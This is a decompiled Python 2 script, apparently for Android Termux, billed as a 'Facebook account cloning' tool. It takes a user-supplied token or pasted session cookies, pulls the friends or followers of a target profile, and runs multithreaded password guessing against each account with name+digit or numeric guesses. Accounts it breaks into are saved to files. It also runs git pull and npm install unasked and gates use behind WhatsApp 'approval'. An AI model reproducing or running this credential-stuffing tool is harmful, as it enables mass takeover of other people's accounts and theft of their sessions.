# Decompiled By Ubaid Ullah

# Github : https://github.com/ubaid78

# uncompyle6 version 3.7.4

# Python bytecode 2.7

# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:58:25) 

# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/

# Embedded file name: aso

import os, sys, time, datetime, re, threading, json, random, requests, hashlib, cookielib, uuid

from multiprocessing.pool import ThreadPool

from requests.exceptions import ConnectionError

__author__ = 'Ubaid Ullah'

__copyright = 'All rights reserved . Copyright  Ubaid Ullah'

os.system('termux-setup-storage')

try:

    os.mkdir('/sdcard/ids')

except OSError:

    pass

bd = random.randint(20000000.0, 30000000.0)

sim = random.randint(20000, 40000)

header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 

   'x-fb-net-hni': repr(sim), 

   'x-fb-connection-quality': 'EXCELLENT', 

   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 

   'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 

   'content-type': 'application/x-www-form-urlencoded', 

   'x-fb-http-engine': 'Liger'}

os.system('git pull')

os.system('clear')

logo = """

\033[1;94m  __________$$$$$$

_________$$____$$

_________$$$__$$$

_________$$_$$_$$

_________$$____$$

_________$$____$$

_________$$____$$

_________$$____$$$$$$$

___$$$$$$$$____$$____$$

_$$$$$___$$____$$____$$$$$$

$$$_$$___$$____$$____$$___$$

$$__$$___$$____$$____$$___$$

$$__$$___$$____$$____$$___$$

$$__$$___$$____$$___$$$___$$

$$__$$___$$____$$____$____$$

$$____$$$__$$$$__$$$$___$_$$

$$________________________$$

_$$________𝕦𝕓𝕒𝕚𝕕__________$$

_$$$_____________________$$

__$$$$_________________$$$

____$$_________________$

____$$$_______________$$

 \033[37;1m[\033[41;1m FACEBOOK ACCOUNT CLONING \033[00;1m\033[37;1m ]\n

 \033[32;1mCreator \033[37;1m: \033[33;1mUbaid Ullah 

 \033[32;1mVersion \033[37;1m: \033[33;1m1.2

"""

def reg():

    os.system('clear')

    print logo

    print ''

    print '\x1b[1;31;1mTake The Approval For Login'

    print ''

    time.sleep(1)

    try:

        to = open('/sdcard/.hst.txt', 'r').read()

    except (KeyError, IOError):

        reg2()

    r = requests.get('https://raw.githubusercontent.com/Ubaid-78/filecrack3/main/server.txt').text

    if to in r:

        os.system('cd ..... && npm install')

        os.system('fuser -k 5000/tcp &')

        os.system('#')

        os.system('cd ..... && node index.js &')

        time.sleep(5)

        ip()

    else:

        os.system('clear')

        print logo

        print '\tApproved Failed'

        print ' \x1b[1;92mYour Id Is Not Approved Already '

        print ' \x1b[1;92mCopy the id and send to admin'

        print ' \x1b[1;92mYour id: ' + to

        raw_input('\x1b[1;93m Press enter to send id')

        os.system('xdg-open https://wa.me/+923473194318')

        reg()

def reg2():

    os.system('clear')

    print logo

    print '\tApproval not detected'

    print ' \x1b[1;92mCopy and press enter , then select whatsapp to continue'

    id = uuid.uuid4().hex[:50]

    print ' Your id: ' + id

    print ''

    raw_input(' Press enter to go to whatsapp ')

    os.system('xdg-open https://wa.me/+923473194318')

    sav = open('/sdcard/.hst.txt', 'w')

    sav.write(id)

    sav.close()

    raw_input('\x1b[1;92m Press enter to check Approval ')

    reg()

def ip():

    os.system('clear')

    print logo

    print '\tCollecting device info'

    try:

        ipinfo = requests.get('http://ip-api.com/json/')

        z = json.loads(ipinfo.text)

        ips = z['query']

        country = z['country']

        regi = z['regionName']

        network = z['isp']

    except:

        pass

    print '\x1b[1;92m Your ip: ' + ips

    time.sleep(1)

    print '\x1b[1;92m Your country: ' + country

    time.sleep(1)

    print '\x1b[1;92m Your region: ' + regi

    time.sleep(1)

    print ' \x1b[1;92mYour network: ' + network

    time.sleep(1)

    print ' Loading ...'

    time.sleep(1)

    log_menu()

def log_menu():

    try:

        t_check = open('access_token.txt', 'r')

        menu()

    except (KeyError, IOError):

        os.system('clear')

        print logo

        print '\x1b[1;93m ~~~~ Login menu ~~~~\x1b[1;91m'

        print 47 * '-'

        print '\x1b[1;92m[1] Login with FaceBook'

        print '\x1b[1;92m[2] Login with token'

        print '\x1b[1;92m[3] Login with cookies'

        print ''

        log_menu_s()

def log_menu_s():

    s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Mr-Robot\xe2\x9e\xa4 ')

    if s == '1':

        log_fb()

    elif s == '2':

        log_token()

    elif s == '3':

        log_cookie()

    else:

        print ''

        print '\\ Select valid option '

        print ''

        log_menu_s()

def log_fb():

    os.system('clear')

    print logo

    print '\x1b[1;31;1mLogin with id/pass'

    print 47 * '-'

    lid = raw_input('\x1b[1;92m Id/mail/no: ')

    pwds = raw_input(' \x1b[1;93mPassword: ')

    try:

        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text

        q = json.loads(data)

        if 'loc' in q:

            ts = open('access_token.txt', 'w')

            ts.write(q['loc'])

            ts.close()

            menu()

        elif 'www.facebook.com' in q['error']:

            print ' User must verify account before login'

            raw_input('\x1b[1;92m Press enter to try again ')

            log_fb()

        else:

            print ' Id/Pass may be wrong'

            raw_input(' \x1b[1;92mPress enter to try again ')

            log_fb()

    except:

        print ''

        print 'Exiting tool'

        os.system('exit')

def log_token():

    os.system('clear')

    print logo

    print '\x1b[1;93mLogin with token\x1b[1;91m'

    print 47 * '-'

    tok = raw_input(' \x1b[1;92mPaste token here: \x1b[1;91m')

    print 47 * '-'

    t_s = open('access_token.txt', 'w')

    t_s.write(tok)

    t_s.close()

    menu()

def log_cookie():

    os.system('clear')

    print logo

    print ''

    print '\x1b[1;31;1mLogin Cookies'

    print ''

    try:

        cookie = raw_input(' Paste cookies here: ')

        data = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'referer': 'https://m.facebook.com/', 

           'host': 'm.facebook.com', 

           'origin': 'https://m.facebook.com', 

           'upgrade-insecure-requests': '1', 

           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 

           'cache-control': 'max-age=0', 

           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 

           'content-type': 'text/html; charset=utf-8', 

           'cookie': cookie}

        c1 = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers=data)

        c2 = re.search('(EAAA\\w+)', c1.text)

        hasil = c2.group(1)

        ok = open('access_token.txt', 'w')

        ok.write(hasil)

        ok.close()

        menu()

    except AttributeError:

        print ''

        print '\tInvalid cookies'

        print ''

        raw_input(' \x1b[1;92mPress enter to try again ')

        log_menu()

    except UnboundLocalError:

        print ''

        print '\tInvalid cookies'

        print ''

        raw_input(' \x1b[1;92mPress enter to try again ')

        log_menu()

    except requests.exceptions.SSLError:

        print ''

        print '\tInvalid cookies'

        print ''

        raw_input(' \x1b[1;92mPress enter to try again ')

        log_menu()

def menu():

    os.system('clear')

    try:

        token = open('access_token.txt', 'r').read()

    except (KeyError, IOError):

        print ''

        print logo

        print '\x1b[1;31;1mLogin FB id to continue'

        time.sleep(1)

        log_menu()

    try:

        r = requests.get('https://graph.facebook.com/me?access_token=' + token)

        q = json.loads(r.text)

        z = q['name']

    except (KeyError, IOError):

        print logo

        print ''

        print '\t Account Cheekpoint\x1b[0;97m'

        print ''

        os.system('rm -rf access_token.txt')

        time.sleep(1)

        log_menu()

    except requests.exceptions.ConnectionError:

        print logo

        print ''

        print '\t Turn on mobile data/wifi\x1b[0;97m'

        print ''

        raw_input(' \x1b[1;92mPress enter after turning on mobile data/wifi ')

        menu()

    os.system('clear')

    print logo

    tok = open('/sdcard/.hst.txt', 'r').read()

    print '  \x1b[1;92mLogged in user: \x1b[1;91m' + z

    print 47 * '-'

    print ' \x1b[1;93m Active token: \x1b[1;91m' + tok

    print ' ------------------------------------------ '

    print '\x1b[1;92m[1] Crack with Name password'

    print '\x1b[1;92m[2] Crack with Number password'

    print '\x1b[1;92m[3] File Extract'

    print '\x1b[1;92m[4] View token'

    print '\x1b[1;92m[5] Logout'

    print '\x1b[1;92m[6] Delete trash files'

    menu_s()

def menu_s():

    ms = raw_input('\x1b[1;97m\xe2\x95\xb0\xe2\x94\x80jutt\xe2\x9e\xa4 ')

    if ms == '1':

        auto_crack()

    elif ms == '2':

        choice_crack()

    elif ms == '3':

        os.system('python2 successful.py')

    elif ms == '4':

        v_tok()

    elif ms == '5':

        lout()

    elif ms == '6':

        rtrash()

    else:

        print ''

        print '\tSelect valid option'

        print ''

        menu_s()

def crack():

    global toket

    try:

        toket = open('login.txt', 'r').read()

    except (KeyError, IOError):

        os.system('clear')

        print logo

        print '\t File Not Found \x1b[0;97m'

        print ''

        time.sleep(1)

        log_menu()

    os.system('clear')

    print logo

    print '\x1b[1;93m~~~~ Name pass cracking ~~~~\x1b[1;91m'

    print 47 * '-'

    print '\x1b[1;92m[1] Public id cloning'

    print '\x1b[1;92m[2] Followers cloning'

    print '\x1b[1;92m[3] File cloning'

    print '\x1b[1;92m[0] Back'

    a_s()

def auto_crack():

    global token

    try:

        token = open('access_token.txt', 'r').read()

    except (KeyError, IOError):

        os.system('clear')

        print logo

        print '\t Login FB id to continue\x1b[0;97m'

        print ''

        time.sleep(1)

        log_menu()

    os.system('clear')

    print logo

    print '\x1b[1;93m~~~~ Name pass cracking ~~~~\x1b[1;91m'

    print 47 * '-'

    print '\x1b[1;92m[1] Public id cloning'

    print '\x1b[1;92m[2] Followers cloning'

    print '\x1b[1;92m[3] File cloning'

    print '\x1b[1;92m[B] Back'

    a_s()

def a_s():

    id = []

    cps = []

    oks = []

    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80jutt\xe2\x9e\xa4 ')

    if a_s == '1':

        os.system('clear')

        print logo

        print '\x1b[1;93m~~~~ Name pass public cracking ~~~~\x1b[1;91m'

        print 47 * '-'

        print '\x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'

        print 47 * '-'

        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')

        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')

        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')

        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')

        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')

        try:

            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)

            q = json.loads(r.text)

            z = q['name']

            os.system('clear')

            print logo

            print '\x1b[1;93m~~~~Name pass public cracking~~~~'

            print ' \x1b[1;92mCloning from: ' + z

        except (KeyError, IOError):

            print '\t Invalid user \x1b[0;97m'

            raw_input(' \x1b[1;92mPress enter to try again ')

            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)

        z = json.loads(r.text)

        for i in z['data']:

            uid = i['id']

            na = i['name']

            nm = na.rsplit(' ')[0]

            id.append(uid + '|' + nm)

    elif a_s == '2':

        os.system('clear')

        print logo

        print '\x1b[1;93m~~~~ Name pass followers cracking ~~~~\x1b[1;91m'

        print 47 * '-'

        print ' \x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'

        print 47 * '-'

        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')

        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')

        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')

        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')

        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')

        try:

            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)

            q = json.loads(r.text)

            z = q['name']

            os.system('clear')

            print logo

            print '\x1b[1;93m~~~~ Name pass followers cracking ~~~~'

            print ' \x1b[1;92mCloning from: ' + z

        except (KeyError, IOError):

            print '\t Invalid user \x1b[0;97m'

            raw_input('\x1b[1;92mPress enter to try again ')

            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')

        z = json.loads(r.text)

        for i in z['data']:

            uid = i['id']

            na = i['name']

            nm = na.rsplit(' ')[0]

            id.append(uid + '|' + nm)

    elif a_s == '3':

        os.system('clear')

        print logo

        print '\x1b[1;93m~~~~ Name pass File cracking ~~~~\x1b[1;91m'

        print 47 * '-'

        print '\x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'

        print 47 * '-'

        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')

        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')

        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')

        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')

        try:

            idlist = raw_input('[+] File Name: ')

            for line in open(idlist, 'r').readlines():

                id.append(line.strip())

        except IOError:

            print '[!] File Not Found.'

            raw_input('Press Enter To Back. ')

            crack()

    elif a_s == '0':

        menu()

    else:

        print ''

        print '\tChoose valid option' + w

        a_s()

    print ' Total ids: ' + str(len(id))

    time.sleep(0.5)

    print ' \x1b[1;97mCrack Running\x1b[1;91m '

    time.sleep(0.5)

    print 47 * '-'

    print '\t\x1b[1;94mThanks To My Mind Mr-Ubaid\x1b[1;91m'

    print 47 * '-'

    def main(arg):

        user = arg

        uid, name = user.split('|')

        try:

            pass1 = name.lower() + p1

            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text

            q = json.loads(data)

            if 'loc' in q:

                print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'

                ok = open('/sdcard/ids/OK.txt', 'a')

                ok.write(uid + ' | ' + pass1 + '\n')

                ok.close()

                oks.append(uid + pass1)

            elif 'www.facebook.com' in q['error']:

                print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass1

                cp = open('CP.txt', 'a')

                cp.write(uid + ' | ' + pass1 + '\n')

                cp.close()

                cps.append(uid + pass1)

            else:

                pass2 = name.lower() + p2

                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text

                q = json.loads(data)

                if 'loc' in q:

                    print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'

                    ok = open('/sdcard/ids/OK.txt', 'a')

                    ok.write(uid + ' | ' + pass2 + '\n')

                    ok.close()

                    oks.append(uid + pass2)

                elif 'www.facebook.com' in q['error']:

                    print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass2

                    cp = open('CP.txt', 'a')

                    cp.write(uid + ' | ' + pass2 + '\n')

                    cp.close()

                    cps.append(uid + pass2)

                else:

                    pass3 = name.lower() + p3

                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text

                    q = json.loads(data)

                    if 'loc' in q:

                        print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'

                        ok = open('/sdcard/ids/OK.txt', 'a')

                        ok.write(uid + ' | ' + pass3 + '\n')

                        ok.close()

                        oks.append(uid + pass3)

                    elif 'www.facebook.com' in q['error']:

                        print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass3

                        cp = open('CP.txt', 'a')

                        cp.write(uid + ' | ' + pass3 + '\n')

                        cp.close()

                        cps.append(uid + pass3)

                    else:

                        pass4 = name.lower() + p4

                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text

                        q = json.loads(data)

                        if 'loc' in q:

                            print '\x1b[1;92m[-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'

                            ok = open('/sdcard/ids/OK.txt', 'a')

                            ok.write(uid + ' | ' + pass4 + '\n')

                            ok.close()

                            oks.append(uid + pass4)

                        elif 'www.facebook.com' in q['error']:

                            print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass4

                            cp = open('CP.txt', 'a')

                            cp.write(uid + ' | ' + pass4 + '\n')

                            cp.close()

                            cps.apppend(uid + pass4)

        except:

            pass

    p = ThreadPool(30)

    p.map(main, id)

    print 47 * '-'

    print ' \x1b[1;92mCrack Done'

    print ' \x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))

    print 47 * '-'

    raw_input(' \x1b[1;93mPress enter to back')

    auto_crack()

def crack_b():

    global toket

    try:

        toket = open('login.txt', 'r').read()

    except (KeyError, IOError):

        os.system('clear')

        print logo

        print '\t File Not Found \x1b[0;97m'

        time.sleep(1)

        log_menu()

    os.system('clear')

    print logo

    print '\x1b[1;93m~~~~ Number pass cracking ~~~~\x1b[1;91m'

    print 47 * '-'

    print '\x1b[1;92m[1] Public id cloning'

    print '\x1b[1;92m[2] Followers cloning'

    print '\x1b[1;92m[3] File cloning'

    print '\x1b[1;92m[0] Back'

    c_s()

def choice_crack():

    global token

    try:

        token = open('access_token.txt', 'r').read()

    except (KeyError, IOError):

        os.system('clear')

        print logo

        print '\x1b[1;93m~~~ Login FB id to continue ~~~'

        time.sleep(1)

        log_menu()

    os.system('clear')

    print logo

    print '\x1b[1;93m~~~~ Number pass cracking ~~~~\x1b[1;91m'

    print 47 * '-'

    print '\x1b[1;92m[1] Public id cloning'

    print '\x1b[1;92m[2] Followers cloning'

    print '\x1b[1;92m[3] File cloning'

    print '\x1b[1;92m[B] Back'

    c_s()

def c_s():

    id = []

    cps = []

    oks = []

    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80jutt\xe2\x9e\xa4 ')

    if a_s == '1':

        os.system('clear')

        print logo

        print '\x1b[1;93m ~~~~ Number pass Public cracking ~~~~\x1b[1;91m'

        print 47 * '-'

        print '\x1b[1;93m For example:234567,223344,334455,445566\x1b[1;91m'

        print 47 * '-'

        pass1 = raw_input(' \x1b[1;92m[1]Password: ')

        pass2 = raw_input(' \x1b[1;92m[2]Password: ')

        pass3 = raw_input(' \x1b[1;92m[3]Password: ')

        pass4 = raw_input(' \x1b[1;92m[4]Password: ')

        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')

        try:

            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)

            q = json.loads(r.text)

            z = q['name']

            os.system('clear')

            print logo

            print '\x1b[1;93m ~~~~ Number pass Public cracking ~~~~'

            print ' Cloning from: ' + z

        except (KeyError, IOError):

            print '\t Invalid user \x1b[0;97m'

            raw_input(' Press enter to try again ')

            choice_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)

        z = json.loads(r.text)

        for i in z['data']:

            uid = i['id']

            na = i['name']

            nm = na.rsplit(' ')[0]

            id.append(uid + '|' + nm)

    elif a_s == '2':

        os.system('clear')

        print logo

        print '\x1b[1;93m~~~~ Number pass followers cracking ~~~~\x1b[1;91m'

        print 47 * '-'

        print '\x1b[1;93m For example:234567,223344,334455,445566\x1b[1;91m'

        print 47 * '-'

        pass1 = raw_input(' \x1b[1;92m[1]Password: ')

        pass2 = raw_input(' \x1b[1;92m[2]Password: ')

        pass3 = raw_input(' \x1b[1;92m[3]Password: ')

        pass4 = raw_input(' \x1b[1;92m[4]Password: ')

        idt = raw_input(' \x1b[1;93mEnter id: ')

        try:

            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)

            q = json.loads(r.text)

            z = q['name']

            os.system('clear')

            print logo

            print '\x1b[1;93m~~~~ Number pass followers cracking ~~~~'

            print ' Cloning from: ' + z

        except (KeyError, IOError):

            print '\t Invalid user \x1b[0;97m'

            raw_input('Press enter to try again ')

            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')

        z = json.loads(r.text)

        for i in z['data']:

            uid = i['id']

            na = i['name']

            nm = na.rsplit(' ')[0]

            id.append(uid + '|' + nm)

    elif a_s == '3':

        os.system('clear')

        print logo

        print '\x1b[1;93m ~~~~ Number pass File cracking ~~~~\x1b[1;91m'

        print 47 * '-'

        print '\x1b[1;93m For example:234567,223344,334455,445566\x1b[1;91m'

        print 47 * '-'

        pass1 = raw_input(' \x1b[1;92m[1]Password: ')

        pass2 = raw_input(' \x1b[1;92m[2]Password: ')

        pass3 = raw_input(' \x1b[1;92m[3]Password: ')

        pass4 = raw_input(' \x1b[1;92m[4]Password: ')

        try:

            idlist = raw_input('[+] File Name: ')

            for line in open(idlist, 'r').readlines():

                id.append(line.strip())

        except IOError:

            print '[!] File Not Found.'

            raw_input('Press Enter To Back. ')

            crack_b()

    elif a_s == '0':

        menu()

    else:

        print ''

        print '\t Choose valid option' + w

        c_s()

    print ' Total ids: ' + str(len(id))

    time.sleep(0.5)

    print ' \x1b[1;97m~~~ Crack Running ~~~\x1b[1;91m'

    time.sleep(0.5)

    print 47 * '-'

    print '\t\x1b[1;94mThanks To My Mind Mr-Robot\x1b[1;91m'

    print 47 * '-'

    def main(arg):

        user = arg

        uid, name = user.split('|')

        try:

            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text

            q = json.loads(data)

            if 'loc' in q:

                print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'

                ok = open('/sdcard/ids/OK.txt', 'a')

                ok.write(uid + ' | ' + pass1 + '\n')

                ok.close()

                oks.append(uid + pass1)

            elif 'www.facebook.com' in q['error']:

                print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass1

                cp = open('CP.txt', 'a')

                cp.write(uid + ' | ' + pass1 + '\n')

                cp.close()

                cps.append(uid + pass1)

            else:

                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text

                q = json.loads(data)

                if 'loc' in q:

                    print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'

                    ok = open('/sdcard/ids/OK.txt', 'a')

                    ok.write(uid + ' | ' + pass2 + '\n')

                    ok.close()

                    oks.append(uid + pass2)

                elif 'www.facebook.com' in q['error']:

                    print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass2

                    cp = open('CP.txt', 'a')

                    cp.write(uid + ' | ' + pass2 + '\n')

                    cp.close()

                    cps.append(uid + pass2)

                else:

                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text

                    q = json.loads(data)

                    if 'loc' in q:

                        print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'

                        ok = open('/sdcard/ids/OK.txt', 'a')

                        ok.write(uid + ' | ' + pass3 + '\n')

                        ok.close()

                        oks.append(uid + pass3)

                    elif 'www.facebook.com' in q['error']:

                        print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass3

                        cp = open('CP.txt', 'a')

                        cp.write(uid + ' | ' + pass3 + '\n')

                        cp.close()

                        cps.append(uid + pass3)

                    else:

                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text

                        q = json.loads(data)

                        if 'loc' in q:

                            print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'

                            ok = open('/sdcard/ids/OK.txt', 'a')

                            ok.write(uid + ' | ' + pass4 + '\n')

                            ok.close()

                            oks.append(uid + pass4)

                        elif 'www.facebook.com' in q['error']:

                            print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass4

                            cp = open('CP.txt', 'a')

                            cp.write(uid + ' | ' + pass4 + '\n')

                            cp.close()

                            cps.apppend(uid + pass4)

        except:

            pass

    p = ThreadPool(30)

    p.map(main, id)

    print 47 * '-'

    print ' \x1b[1;92mCrack Done'

    print '\x1b[1;92m Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))

    print 47 * '-'

    raw_input('\x1b[1;93m Press enter to back')

    choice_crack()

if __name__ == '__main__':

    reg()

